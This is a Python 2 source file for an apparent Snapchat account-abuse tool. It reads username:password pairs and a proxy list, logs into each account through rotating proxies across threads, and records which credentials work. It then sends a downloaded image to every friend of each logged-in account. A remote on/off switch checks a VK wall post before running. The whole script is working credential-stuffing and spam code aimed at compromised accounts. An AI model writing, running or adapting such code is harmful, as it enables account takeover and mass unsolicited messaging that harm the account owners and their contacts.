import urllib2, urllib, requests, json, threading, socket, sys
from snapi import Snapchat
from datetime import datetime

inputData = []
inputProxies = []
imagename = ""
threads = 1

def main():
    global threads, inputData, inputProxies
    # check everything first
    t = datetime.now()
    print t  #!!!
    sts = checkStates() 
    if sts == 0:
        print "Fatal error. Contact me on skype 'volkvid'"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0) 
    elif sts == 1: 
        f = open("output.txt", "w")
        f.close()
        prepair()
        #print "threads =", threads #22:36:23, 
        if threads == 1:
            oneThread(inputData, inputProxies)
        else:
            leni = len(inputData)
            if threads > leni:
                threads = leni
            
            authdata = slice_list(inputData, threads)
            thr = []
            for i in range(threads):
                data = authdata[i]
                prx = inputProxies
                
                thread = threading.Thread(target=oneThread, args=(data, prx, ))
                thread.start()
                thr.append(thread)
                #thread.join()

            for t in thr:
                t.join()

            print "\nRun out of accounts"
            print "time =", str(datetime.now() - t)


def oneThread(inp, inpProxy):
    result = {}
    for proxy in inpProxy:
        for auth in inp: 
            s = auth["user"]+":"+auth["pass"]
            if s not in result:
                r = process(proxy, auth)
                if r["st"] != 0:
                    #any error
                    if r["st"] == -100:
                        result[s] = "#error, wrong pass"
                        print s + " #error, wrong pass"
                        fff = open("output.txt", "a")
                        fff.write(s + " #error, wrong pass\n")
                        fff.close()
                    if r["st"] == -101:
                        result[s] = "#error, no account"
                        print s + " #error, no account"
                        fff = open("output.txt", "a")
                        fff.write(s + " #error, no account\n")
                        fff.close()
                    if r["st"] == 400:
                        result[s] = "#error, may be no friends"
                        print s + " error, may be no friends"
                        fff = open("output.txt", "a")
                        fff.write(s + " error, may be no friends\n")
                        fff.close()
                    if r["st"] == 408:
                        result[s] = "#error, req timeout"
                        print s + " error, req timeout"
                        fff = open("output.txt", "a")
                        fff.write(s + " error, req timeout\n")
                        fff.close()
                    if r["st"] == 403:
                        break #its ok. test on all accs and delete debug outp
                else:
                    #no errors 
                    if r["num"] == 0:
                        result[s] = "#error"
                        print s + " #error"
                        fff = open("output.txt", "a")
                        fff.write(s + " #error\n")
                        fff.close()
                    else:
                        result[s] = "#" + str(r["num"])
                        print s + " #" + str(r["num"])
                        fff = open("output.txt", "a")
                        fff.write(s + " #" + str(r["num"]) + "\n")
                        fff.close()
    if len(inp) != len(result):
        print "Ran out of proxies"


# start new thread with a pack of users, for ex: 100 users -> 5 threads with 20 users
def process(prox, auth):
    prox = {"https": "https://"+prox}
    ret = {"st": 403, "num": 0}
    try:
        s = Snapchat()
        s.proxies = prox
        # measure "ping"
        #tt = datetime.now()
        login = s.login(auth["user"], auth["pass"])
        #dt = (datetime.now()-tt).total_seconds()
        # timeout 
        #if dt >= 5.0:
            #ret["st"] = 408
            #return ret
            
        try:
            status = login['status']
            ret["st"] = status
            #print "(st)"
            return ret
        except:
            pass

        # upload pic for curr account
        try:
            media_id = s.upload(imagename)
        except Exception as ze:
            #print "(upload)", str(ze)
            pass

        recipients = ""
        for friend in login["friends"]:
            recipients += friend["name"] + ","
        try:
            #flag = "1"
            done = s.send(media_id, recipients, time = 10)
            if done:
                #print "(done), fr =", len(login["friends"])
                ret["st"] = 0
                ret["num"] = len(login["friends"])
                return ret 
        except Exception as ex:
            #flag = "0"
            #print "(send)" , str(ex), "q f =", len(login["friends"])
            ret["st"] = 403
            return ret
            
        
    except Exception as ex:
        #print "(process)", str(ex)
        return ret


def prepair():
    # IO here, updating all globals
    global imagename, threads, inputData, inputProxies
    try:
        proxiesFile = open("proxies.txt", "r")
        data = proxiesFile.read()
        proxiesFile.close()
        
        if data.find("\r\n") != -1:
            inputProxies = data.split("\r\n")
        else:
            inputProxies = data.split("\n")        
    except BaseException as ex:
        print "No file named 'proxies.txt', error " + str(ex)
        print "\nPress any key to exit"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0)

    try:
        inputFile = open("input.txt", "r")
        data = inputFile.read()
        inputFile.close()
        # because win/mac
        if data.find("\r\n") != -1:
            data = data.split("\r\n")
        else:
            data = data.split("\n")
            
        for item in data:
            item = item.split(":")
            inputData.append({
                "user":item[0].replace("\n", "").replace("\r\n", ""), 
                "pass":item[1].replace("\n", "").replace("\r\n", "")
                }) 
    except BaseException as ex:
        print "No file named 'input.txt', error " + str(ex)
        print "\nPress any key to exit"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0)

    image = ""
    try:
        settingsFile = open("settings.txt", "r")
        data = settingsFile.read()
        settingsFile.close()

        if data.find("\r\n") != -1:
            data = data.split("\r\n")
        else:
            data = data.split("\n")
    
        for item in data:
            if item.find("image:") != -1:
                image = item.replace(" ", "")
            if item.find("threads:") != -1:
                threads = item.replace(" ", "")
        image = image.split("image:")[1]
        threads = int(threads.split("threads:")[1])
        if threads < 1:
            threads = 1
        #print "thr", threads 
    except BaseException as ex:
        print "No file named 'settings.txt', error " + str(ex)
        print "\nPress any key to exit"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0)

    form = image.split("/")
    form = form[len(form)-1].split(".")[1]
    imagename = "file." + form
    urllib.urlretrieve(image, filename=imagename)
    #print "image is downloaded"


def checkStates():
    url = "https://api.vk.com/method/wall.get"
    params = {"owner_id": "-79888882", "count": "100", "offset": "0", "v": "5.26"}
    r = requests.post(url, params = params)#, verify=False)
    r = json.loads(r.text)
    # check if exists
    pid = -1
    for item in r['response']['items']:
        if item['text'] == 'snapchat controll': #code1
            pid = item['id']

    if pid == -1:
        return 0
    else:
        url = "https://api.vk.com/method/wall.getComments"
        params = { "owner_id": "-79888882", "post_id": pid,
                   "count": "1", "offset": "0", "v": "5.26"}
        r = requests.post(url, params = params)#, verify=False)
        r = json.loads(r.text)
        # only first code is checked
        try:
            r = r['response']['items'][0]
            if r['text'] == 'isok' and r['from_id'] == -79888882: #code2
                return 1
            else:
                return 0
        except:
            return 0


def slice_list(input, size):
    input_size = len(input)
    slice_size = input_size / size
    remain = input_size % size
    result = []
    iterator = iter(input)
    for i in range(size):
        result.append([])
        for j in range(slice_size):
            result[i].append(iterator.next())
        if remain:
            result[i].append(iterator.next())
            remain -= 1
    return result


main()
